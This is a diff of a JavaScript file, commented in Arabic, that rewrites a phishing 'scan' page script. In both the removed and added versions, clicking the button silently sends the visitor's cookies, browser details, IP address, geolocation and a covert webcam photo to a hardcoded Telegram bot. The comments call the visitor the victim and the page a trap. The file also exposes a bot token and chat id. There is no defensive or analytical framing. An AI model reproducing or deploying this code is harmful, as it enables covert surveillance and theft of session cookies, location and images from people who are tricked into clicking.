@@ -1,85 +1,77 @@
 (function() {
-    // إعدادات البوت الخاصة بك
+    // إعدادات البوت
     const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
     const _id = "7253092491";
 
-    // دالة إرسال التقارير النصية
-    function _send(msg) {
-        const url = `https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[LOG]: " + msg)}`;
-        navigator.sendBeacon(url);
+    // دالة إرسال النصوص المحسنة
+    function _report(text) {
+        fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM]: " + text)}`);
     }
 
-    // دالة إرسال الصورة كملف
-    function _sendPhoto(blob) {
-        const formData = new FormData();
-        formData.append('chat_id', _id);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', '🎯 صورة من النظام بجودة عالية');
-
-        fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).then(() => _send("تم رفع الصورة بنجاح ✅"));
-    }
-
-    const startBtn = document.getElementById('startScanBtn');
-    if(startBtn) {
-        startBtn.addEventListener('click', async () => {
-            _send("بدأت عملية سحب البيانات الكاملة 🚀");
-
-            // 1. جمع الكوكيز وبيانات الجهاز
-            const cookies = document.cookie || "لا توجد كوكيز (أو المتصفح يحميها)";
-            const deviceInfo = `
-📱 نظام التشغيل: ${navigator.platform}
-🌐 المتصفح: ${navigator.userAgent}
-🍪 الكوكيز المتاحة: ${cookies}
-            `;
-            _send(deviceInfo);
-
-            // 2. الموقع الجغرافي والـ IP
-            _getAdvancedInfo();
-
-            // 3. سحب الصورة
-            _capturePhoto();
-        });
-    }
-
-    async function _getAdvancedInfo() {
+    async function _captureAndSend() {
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            _send(`📍 IP: ${data.ip}`);
-        } catch(e) {}
+            // طلب الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            _report("تم فتح الكاميرا.. جاري التقاط الصورة 📸");
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((p) => {
-                _send(`📍 خريطة: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
-        }
-    }
-
-    async function _capturePhoto() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
             const video = document.createElement('video');
             video.srcObject = stream;
-            video.play();
+            video.muted = true;
+            await video.play();
 
-            // ننتظر قليلاً لضبط الإضاءة قبل اللقطة
+            // ننتظر 3 ثواني عشان الصورة تظبط
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
                 canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob((blob) => {
-                    _sendPhoto(blob);
-                    stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
-                }, 'image/jpeg', 0.8);
-            }, 2500);
-        } catch (e) {
-            _send("❌ الضحية رفض الكاميرا");
+
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', _id);
+                    fd.append('photo', blob, 'image.jpg');
+                    fd.append('caption', '🎯 صورة الضحية من المصيدة');
+
+                    // إرسال الصورة فعلياً
+                    fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    }).then(res => {
+                        if(res.ok) _report("تم إرسال الصورة بنجاح ✅");
+                        else _report("فشل إرسال الصورة للسيرفر ❌");
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                }, 'image/jpeg', 0.7);
+            }, 3000);
+
+        } catch (err) {
+            _report("فشل الوصول للكاميرا (رفض أو لا توجد) ❌");
         }
     }
-})();
 
+    // ربط الزرار
+    const btn = document.getElementById('startScanBtn');
+    if (btn) {
+        btn.addEventListener('click', () => {
+            _report("بدأ المستخدم عملية الفحص الآن 🚀");
+            
+            // جلب الـ IP
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => _report("IP الضحية: " + d.ip));
+
+            // جلب الموقع
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    _report(`الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                });
+            }
+
+            // سحب الكوكيز
+            _report("الكوكيز: " + (document.cookie || "لا يوجد"));
+
+            // التقاط الصورة
+            _captureAndSend();
+        });
+    }
+})();
